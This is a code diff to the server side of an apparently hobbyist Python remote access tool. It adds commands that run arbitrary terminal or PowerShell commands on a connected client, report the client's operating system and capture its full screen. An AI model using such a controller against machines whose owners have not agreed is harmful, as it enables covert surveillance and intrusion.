@@ -40,15 +40,52 @@ class Server:
             while self.controling:
                 userInput = input("$: ").lower()
                 self.conn.send(userInput.encode())
+                
                 if userInput == "exit":
-                    self.sock.close()
-                    exit(0)
-
-                if userInput == "screenshot":
+                    self.cleanup()
+                elif userInput == "screenshot":
                     self.receive_screenshot()
+                elif userInput == "getos":
+                    max_seconds = 2
+                    ready = select.select([self.conn], [], [], max_seconds)
+                    
+                    if ready[0]:
+                        data = self.conn.recv(1024).decode()
+                        print(f"Client OS: {data}")
+                    else:
+                        print("Command response timeout. Returning to prompt.")
+                        return self.accessing()
+                elif userInput == "clear":
+                    for i in range(10):
+                        threading.Thread(target=self.clearTerminal).start()
+
+                elif userInput == "help":
+                    print("\n-- Help --\n")
+                    print("exit -> send message to client to exit and then close the socket.")
+                    print("screenshot -> take a full screen screenshot of the clients screen")
+                    print("getos -> get the clients operating system")
+                    print("none -> execute a terminal command")
+                    print("clear -> clear the terminal window")
+                    print("")
+                    print("you can type 'powershell' before your comman to execute a powershell command (if window of course)\n")
+                else:
+                    max_seconds = 2
+                    ready = select.select([self.conn], [], [], max_seconds)
+                    
+                    if ready[0]:
+                        data = self.conn.recv(1024).decode()
+                        print(data)
+                    else:
+                        print("Command response timeout. Returning to prompt.")
+                        return self.accessing()
 
         except KeyboardInterrupt:
             self.cleanup()
+
+    def clearTerminal(self):
+        for i in range(999):
+            print("\n")  
+        print("Cleared terminal.\n")  
 
     def receive_screenshot(self):
         try:
@@ -57,7 +94,7 @@ class Server:
             received_size = 0
             screenshot_data = b""
 
-            max_seconds = 5  # Set the timeout period in seconds
+            max_seconds = 5
 
             if not os.path.exists(screenshot_filename):
                 open(screenshot_filename, "x").close()
@@ -97,6 +134,7 @@ class Server:
         except Exception as e:
             print(f"Failed to receive screenshot: {str(e)}")
             return self.accessing()
+
     def cleanup(self):
         self.controling = False
 
@@ -106,7 +144,6 @@ class Server:
             self.sock.close()
 
         print("\nSocket closed.")
-        exit(0)
 
 IP = "127.0.0.1"
 PORT = 13064
